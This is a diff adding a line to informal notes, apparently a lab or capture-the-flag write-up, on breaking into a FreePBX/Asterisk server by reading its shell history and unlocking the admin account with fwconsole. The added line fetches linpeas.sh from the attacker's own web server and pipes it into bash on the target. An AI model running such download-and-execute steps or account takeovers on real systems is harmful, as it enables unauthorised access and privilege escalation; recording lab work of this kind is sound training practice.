@@ -39,3 +39,5 @@ inside the aterisk home folder tehre is a file caleld .asterisk_history with the
 looking in the server files, starting in the admin folder.
 
 after googling how to reset freepbx password from console, i found the command `fwconsole unlock xxx` and replace xxx with the account id displayed on the main page of the website by hitting ctrl a
+
+copied lineas onto the box by doing `python3 -m http.server` and then `curl -L ip:8000/linpeas.sh | bash`
